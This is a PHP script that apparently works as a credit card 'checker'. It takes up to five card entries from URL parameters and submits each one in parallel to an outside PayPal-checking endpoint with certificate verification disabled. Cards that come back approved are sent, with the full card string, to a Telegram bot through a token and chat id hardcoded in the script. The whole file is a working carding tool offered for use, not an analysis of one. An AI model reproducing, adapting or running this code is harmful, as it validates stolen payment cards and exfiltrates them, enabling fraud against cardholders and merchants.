<?php
$listas = [];

// Collect lista1 to lista5 from GET
for ($i = 1; $i <= 5; $i++) {
    if (!isset($_GET["lista$i"])) continue;
    $listas[$i] = trim($_GET["lista$i"]);
}

if (empty($listas)) exit("No lista1-5 provided.");

$multiHandle = curl_multi_init();
$curlHandles = [];

// Setup curl handles
foreach ($listas as $i => $lista) {
    $url = "https://wizvenex.com/Paypal.php?lista=" . urlencode($lista); // 🔁 Replace with your real API

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
    ]);

    $curlHandles[$i] = $ch;
    curl_multi_add_handle($multiHandle, $ch);
}

// Run all requests in parallel
do {
    $status = curl_multi_exec($multiHandle, $active);
    curl_multi_select($multiHandle);
} while ($active && $status == CURLM_OK);

// Handle all responses
foreach ($curlHandles as $i => $ch) {
    $response = curl_multi_getcontent($ch);
    $lista    = $listas[$i];

    // Replace @VENEX444 in browser output too
    $responseBrowser = str_replace('@VENEX444', '@STARBOYWTF', $response);

    // ✅ Check if response is NOT DECLINED and NOT INVALID
    if (stripos($response, "LIVE") !== false && stripos($response, "ADDED") !== false && stripos($response, "APPROVED") !== false) {
    // your code here
    // Clean HTML for Telegram + replace VENEX
    $cleanText = strip_tags($response);
    $cleanText = str_replace('@VENEX444', '@STARBOYWTF', $cleanText);

    $text = "LIVE ✅\nCC - $lista\nRESULT - $cleanText";

    // Send to Telegram
    $tg = curl_init();
    curl_setopt($tg, CURLOPT_URL, "https://api.telegram.org/bot8175217191:AAEIBrGHbHMWp2IF4IsEejYgUqw_k1tcfIk/sendMessage?chat_id=8100683771&text=" . urlencode($text));
    curl_setopt($tg, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($tg, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($tg, CURLOPT_SSL_VERIFYHOST, 0);
    curl_exec($tg);
    curl_close($tg);

    // Echo to browser
    echo "✅ HIT: $lista<br>Response: $responseBrowser<br><br>";
} else {
    // Declined or Invalid → only echo
    echo "❌ DECLINED/INVALID: $lista<br>Response: $responseBrowser<br><br>";
}

    curl_multi_remove_handle($multiHandle, $ch);
    curl_close($ch);
}

curl_multi_close($multiHandle);
?>